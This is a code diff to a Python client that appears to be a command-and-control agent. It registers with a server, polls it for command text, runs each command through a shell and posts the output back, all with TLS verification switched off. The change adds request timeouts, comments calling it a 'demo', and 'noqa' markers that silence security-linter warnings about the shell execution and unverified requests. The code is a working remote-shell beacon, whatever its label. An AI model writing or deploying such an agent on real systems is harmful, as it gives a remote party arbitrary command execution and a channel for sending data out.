@@ -9,7 +9,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def register(server_url):
     try:
-        requests.post(f"{server_url}/register", data="hi", verify=False)
+        # Demo client talks to the self-signed Dispatch listener.
+        requests.post(f"{server_url}/register", data="hi", verify=False, timeout=10)  # noqa: S501
         print("[*] Registered with server.")
     except Exception as e:
         print("Failed to register:", e)
@@ -18,7 +19,7 @@ def register(server_url):
 def poll(server_url, interval=0):
     while True:
         try:
-            r = requests.get(f"{server_url}/data", verify=False)
+            r = requests.get(f"{server_url}/data", verify=False, timeout=10)  # noqa: S501
             cmd = r.text.strip()
 
             if cmd:
@@ -30,11 +31,12 @@ def poll(server_url, interval=0):
                     return
 
                 try:
-                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                    # Demo client runs the command text returned by the server.
+                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)  # noqa: S602
                 except subprocess.CalledProcessError as e:
                     output = e.output
 
-                requests.post(f"{server_url}/data", data=output.decode(), verify=False)
+                requests.post(f"{server_url}/data", data=output.decode(), verify=False, timeout=10)  # noqa: S501
 
         except Exception as e:
             print("[!] Error polling server:", e)
